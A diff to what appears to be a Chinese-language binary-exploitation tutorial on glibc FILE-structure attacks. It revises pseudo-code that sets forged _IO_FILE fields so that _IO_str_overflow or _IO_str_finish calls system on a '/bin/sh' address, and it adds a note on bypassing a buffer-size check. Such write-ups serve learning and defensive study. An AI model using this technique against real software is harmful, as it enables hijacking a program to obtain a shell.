@@ -307,12 +307,14 @@ int _IO_str_overflow (_IO_FILE *fp, int c)
     fp->_flags = 0
     fp->_IO_buf_base = 0
     fp->_IO_buf_end = (bin_sh_addr - 100) / 2		//如果之后替换的时one_gadget而不是system，则不用这一步
-    fp->_IO_write_ptr = 0xffffffff
+    fp->_IO_write_ptr = 0xffffffffff	//这里需要注意，该值不能过小
     fp->_IO_write_base = 0			//实际就是_IO_write_ptr >_IO_write_base
     fp->_mode = 0
+其中fp->\_IO\_write\_ptr的值我们之所以要设置为一个比较大的数是为了绕过`pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)`检查。
+
 此时，根据代码所示可以推导出如下等式：  
-old\_blen = \_IO\_blen(fp) = fp->\_IO\_buf\_end - \_IO\_buf\_base = \_IO\_buf\_end  
-new\_size = 2 * old\_blen + 100 = 2*\_IO\_buf\_end + 100 = (bin\_sh\_addr - 100）/ 2 * 2 + 100 = bin\_sh\_addr  
+`old_blen = _IO_blen(fp) = fp->_IO_buf_end - _IO_buf_base = _IO_buf_end`  
+`new_size = 2 * old_blen + 100 = 2*_IO_buf_end + 100 = (bin_sh_addr - 100）/ 2 * 2 + 100 = bin_sh_addr`  
 这样我们就布置好了system函数需要调用的参数，接下来就是如何控制程序执行流程了。
 
 我们注意到在\_IO\_str\_overflow函数中有这样一行代码
@@ -346,7 +348,7 @@ void _IO_str_finish (_IO_FILE *fp, int dummy)
 
 	fp->_flag = 0
     fp->_mode = 0
-    fp->_IO_write_ptr = 0xffffffff
+    fp->_IO_write_ptr = 0xffffffff	
     fp->_IO_write_base = 0		//_IO_write_ptr > _IO_write_base 即可
     fp->_IO_buf_base = bin_sh_addr
 
